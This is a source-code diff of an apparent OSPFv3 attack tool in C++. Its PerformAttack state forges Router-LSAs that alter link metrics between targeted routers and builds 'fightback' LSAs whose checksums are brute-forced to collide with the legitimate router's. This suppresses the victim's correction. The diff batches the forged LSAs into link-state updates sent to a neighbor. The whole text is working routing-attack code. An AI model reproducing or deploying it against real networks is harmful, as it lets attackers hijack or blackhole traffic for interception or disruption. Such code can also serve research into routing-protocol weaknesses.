@@ -15,7 +15,6 @@
 #include "parser/ospf/DatabaseDescriptionPacket.h"
 #include "parser/ospf/LinkStateRequestPacket.h"
 #include "parser/ospf/LinkStateUpdatePacket.h"
-#include "tinshelper.h"
 #include "parser/ospf/lsa/RouterLSAPacket.h"
 #include "util.h"
 #include <queue>
@@ -338,163 +337,157 @@ namespace statemachine {
 			PerformAttack(my_context ctx) : my_base(ctx) {
 				logger->info("Performing attack.");
 				
-				std::queue<std::shared_ptr<parser::OSPFv3Packet>> sendQueue;
+				std::vector<std::shared_ptr<parser::LSAPacket>> forgedLSAs, forgedFBLSAs;
+				std::set<uint32_t> relevantRouters;
 				
 				for (auto const&[a, b, metric] : context<Machine>().targets) {
-					for (auto const &lsa : context<Machine>().lsas) {
-						if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA &&
-						    (lsa->getHeader().advertising_router == a ||
-						     lsa->getHeader().advertising_router == b)) {
-							auto src = (lsa->getHeader().advertising_router == a) ? a : b;
-							auto dst = (lsa->getHeader().advertising_router == a) ? b : a;
+					relevantRouters.insert(a);
+					relevantRouters.insert(b);
+				}
+				
+				for (auto const &lsa : context<Machine>().lsas) {
+					if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA &&
+					    relevantRouters.count(lsa->getHeader().advertising_router) > 0) {
+						
+						logger->debug("Found ROUTER-LSA from {}.", Tins::IPv4Address(
+							parser::byteswap<uint32_t>(
+								lsa->getHeader().advertising_router)).to_string());
+						
+						auto newLSA = std::make_shared<parser::LSAPacket>(
+							lsa->serialize());
+						
+						{
+							auto newRouterLSA = std::dynamic_pointer_cast<parser::RouterLSAPacket>(
+								newLSA->getSubpacket());
 							
-							logger->debug("Found ROUTER-LSA from {}.", Tins::IPv4Address(parser::byteswap<uint32_t>(src)).to_string());
-							
-							auto newLSA = std::make_shared<parser::LSAPacket>(
-								lsa->serialize());
-							
-							{
-								auto newRouterLSA = std::dynamic_pointer_cast<parser::RouterLSAPacket>(
-									newLSA->getSubpacket());
-								
-								auto interfaces = newRouterLSA->getInterfaces();
-								for (auto &interface : interfaces) {
-									for (auto const&[a2, b2, metric2] : context<Machine>().targets) {
-										if (interface.neighbor_router_id == a2 || interface.neighbor_router_id == b2) {
-											interface.metric = metric2;
-										}
+							auto interfaces = newRouterLSA->getInterfaces();
+							for (auto &interface : interfaces) {
+								for (auto const&[a, b, metric] : context<Machine>().targets) {
+									if ((interface.neighbor_router_id == a &&
+									     lsa->getHeader().advertising_router ==
+									     b) || (interface.neighbor_router_id == b &&
+									            lsa->getHeader().advertising_router ==
+									            a)) {
+										interface.metric = metric;
 									}
 								}
-								newRouterLSA->setInterfaces(interfaces);
-								
-								auto hdr = newLSA->getHeader();
-								hdr.age = 0;
-								hdr.seq += 0x10;
-								newLSA->setHeader(hdr);
-								logger->debug("Forged LSA has seq {} ({}).", hdr.seq, util::to_hex_string(hdr.seq));
 							}
+							newRouterLSA->setInterfaces(interfaces);
 							
-							auto origFBLSA = std::make_shared<parser::LSAPacket>(
-								lsa->serialize());
-							auto newFBLSA = std::make_shared<parser::LSAPacket>(
-								newLSA->serialize());
-							
-							{
-								auto origHdr = origFBLSA->getHeader();
-								origHdr.age = 0;
-								origHdr.seq += 0x11;
-								origFBLSA->setHeader(origHdr);
-								origFBLSA->updateValues();
-								
-								auto tgtChecksum = origFBLSA->getHeader().checksum;
-
-								auto hdr = newFBLSA->getHeader();
-								hdr.age = 0;
-								hdr.seq++;
-								newFBLSA->setHeader(hdr);
-								logger->debug("Forged FBLSA has seq {} ({}).", hdr.seq, util::to_hex_string(hdr.seq));
-								newFBLSA->updateValues();
-								
-								std::optional<std::shared_ptr<parser::LSAPacket>> yay = newFBLSA->modToChecksum(tgtChecksum);
-								
-								int c = 0;
-								while (!yay && (c++ < 16)) {
-									logger->debug("Checksum break failure. Incrementing metric.");
-									
-									auto newRouterLSA = std::dynamic_pointer_cast<parser::RouterLSAPacket>(
-										newFBLSA->getSubpacket());
-									
-									auto interfaces = newRouterLSA->getInterfaces();
-									for (auto &interface : interfaces) {
-										if (interface.neighbor_router_id == dst) {
-											interface.metric++;
-											break;
-										}
-									}
-									newRouterLSA->setInterfaces(interfaces);
-									newFBLSA->updateValues();
-									
-									yay = newFBLSA->modToChecksum(tgtChecksum);
-								}
-								
-								if (c >= 16)
-									throw parser::MalformedPacketException("Unable to break checksum.");
-								
-								newFBLSA = yay.value();
-								newFBLSA->updateValues();
-								
-								if (newFBLSA->getHeader().checksum != origFBLSA->getHeader().checksum) {
-									throw parser::MalformedPacketException("Checksum mismatch.");
-								}
-							}
-							
-							auto forgedOSPFpkt = std::make_shared<parser::OSPFv3Packet>();
-							
-							{
-								auto ospfHdr = forgedOSPFpkt->getHeader();
-								ospfHdr.type = parser::OSPFv3Packet::LINK_STATE_UPDATE;
-								ospfHdr.router_id = context<Machine>().self;
-								ospfHdr.instance_id = 0;
-								ospfHdr.area_id = 0;
-								ospfHdr.version = 3;
-								forgedOSPFpkt->setHeader(ospfHdr);
-								
-								auto lsuPkt = std::make_shared<parser::LinkStateUpdatePacket>();
-								forgedOSPFpkt->setSubpacket(lsuPkt);
-								
-								{
-									auto lsas = lsuPkt->getLsas();
-									lsas.push_back(newLSA);
-									lsuPkt->setLsas(lsas);
-								}
-								
-								uint128_t neigh = context<Machine>().neighbor_hello->getSource();
-								forgedOSPFpkt->setDest(neigh);
-								forgedOSPFpkt->setSourceFromDest();
-								forgedOSPFpkt->updateValues();
-							}
-							
-							auto forgedOSPFFBpkt = std::make_shared<parser::OSPFv3Packet>();
-							
-							{
-								auto ospfHdr = forgedOSPFFBpkt->getHeader();
-								ospfHdr.type = parser::OSPFv3Packet::LINK_STATE_UPDATE;
-								ospfHdr.router_id = context<Machine>().self;
-								ospfHdr.instance_id = 0;
-								ospfHdr.area_id = 0;
-								ospfHdr.version = 3;
-								forgedOSPFFBpkt->setHeader(ospfHdr);
-								
-								auto lsuPkt = std::make_shared<parser::LinkStateUpdatePacket>();
-								forgedOSPFFBpkt->setSubpacket(lsuPkt);
-								
-								{
-									auto lsas = lsuPkt->getLsas();
-									lsas.push_back(newFBLSA);
-									lsuPkt->setLsas(lsas);
-								}
-								
-								uint128_t neigh = context<Machine>().neighbor_hello->getSource();
-								forgedOSPFFBpkt->setDest(neigh);
-								forgedOSPFFBpkt->setSourceFromDest();
-								forgedOSPFFBpkt->updateValues();
-							}
-							
-							sendQueue.push(forgedOSPFpkt);
-							sendQueue.push(forgedOSPFFBpkt);
+							auto hdr = newLSA->getHeader();
+							hdr.age = 0;
+							hdr.seq += 0x10;
+							newLSA->setHeader(hdr);
+							logger->debug("Forged LSA has seq {} ({}).", hdr.seq,
+							              util::to_hex_string(hdr.seq));
 						}
+						
+						auto origFBLSA = std::make_shared<parser::LSAPacket>(
+							lsa->serialize());
+						auto newFBLSA = std::make_shared<parser::LSAPacket>(
+							newLSA->serialize());
+						
+						{
+							auto origHdr = origFBLSA->getHeader();
+							origHdr.age = 0;
+							origHdr.seq += 0x11;
+							origFBLSA->setHeader(origHdr);
+							origFBLSA->updateValues();
+							
+							auto tgtChecksum = origFBLSA->getHeader().checksum;
+							
+							auto hdr = newFBLSA->getHeader();
+							hdr.age = 0;
+							hdr.seq++;
+							newFBLSA->setHeader(hdr);
+							logger->debug("Forged FBLSA has seq {} ({}).", hdr.seq, util::to_hex_string(hdr.seq));
+							newFBLSA->updateValues();
+							
+							std::optional<std::shared_ptr<parser::LSAPacket>> yay = newFBLSA->modToChecksum(tgtChecksum);
+							
+							if (!yay)
+								throw parser::MalformedPacketException("Unable to break checksum.");
+							
+							newFBLSA = yay.value();
+							newFBLSA->updateValues();
+							
+							if (newFBLSA->getHeader().checksum != origFBLSA->getHeader().checksum) {
+								throw parser::MalformedPacketException("Checksum mismatch.");
+							}
+						}
+						
+						forgedLSAs.push_back(newLSA);
+						forgedFBLSAs.push_back(newFBLSA);
 					}
 				}
 				
-				logger->debug("Sending {} packets...", sendQueue.size());
-				while (!sendQueue.empty()) {
-					sendQueue.front()->transmit();
-					sendQueue.pop();
-					if (!sendQueue.empty()) {
+				if (!forgedLSAs.empty()) {
+					logger->debug("Sending a forged OSPF LSU with {} LSAs.", forgedLSAs.size());
+					auto forgedOSPFpkt = std::make_shared<parser::OSPFv3Packet>();
+					
+					{
+						auto ospfHdr = forgedOSPFpkt->getHeader();
+						ospfHdr.type = parser::OSPFv3Packet::LINK_STATE_UPDATE;
+						ospfHdr.router_id = context<Machine>().self;
+						ospfHdr.instance_id = 0;
+						ospfHdr.area_id = 0;
+						ospfHdr.version = 3;
+						forgedOSPFpkt->setHeader(ospfHdr);
+						
+						auto lsuPkt = std::make_shared<parser::LinkStateUpdatePacket>();
+						forgedOSPFpkt->setSubpacket(lsuPkt);
+						
+						{
+							auto lsas = lsuPkt->getLsas();
+							lsas.insert(lsas.end(), forgedLSAs.begin(), forgedLSAs.end());
+							lsuPkt->setLsas(lsas);
+						}
+						
+						uint128_t neigh = context<Machine>().neighbor_hello->getSource();
+						forgedOSPFpkt->setDest(neigh);
+						forgedOSPFpkt->setSourceFromDest();
+						forgedOSPFpkt->updateValues();
+					}
+					
+					forgedOSPFpkt->transmit();
+					
+					if (!forgedFBLSAs.empty()) {
 						std::this_thread::sleep_for(1100ms);
+						
+						logger->debug("Sending a forged OSPF fightback LSU with {} LSAs.",
+						              forgedFBLSAs.size());
+						
+						auto forgedOSPFFBpkt = std::make_shared<parser::OSPFv3Packet>();
+						
+						{
+							auto ospfHdr = forgedOSPFFBpkt->getHeader();
+							ospfHdr.type = parser::OSPFv3Packet::LINK_STATE_UPDATE;
+							ospfHdr.router_id = context<Machine>().self;
+							ospfHdr.instance_id = 0;
+							ospfHdr.area_id = 0;
+							ospfHdr.version = 3;
+							forgedOSPFFBpkt->setHeader(ospfHdr);
+							
+							auto lsuPkt = std::make_shared<parser::LinkStateUpdatePacket>();
+							forgedOSPFFBpkt->setSubpacket(lsuPkt);
+							
+							{
+								auto lsas = lsuPkt->getLsas();
+								lsas.insert(lsas.end(), forgedFBLSAs.begin(),
+								            forgedFBLSAs.end());
+								lsuPkt->setLsas(lsas);
+							}
+							
+							uint128_t neigh = context<Machine>().neighbor_hello->getSource();
+							forgedOSPFFBpkt->setDest(neigh);
+							forgedOSPFFBpkt->setSourceFromDest();
+							forgedOSPFFBpkt->updateValues();
+						}
+						
+						forgedOSPFFBpkt->transmit();
 					}
 				}
-				logger->debug("Sent all packets.");
+				
 			}
 		};
 	}
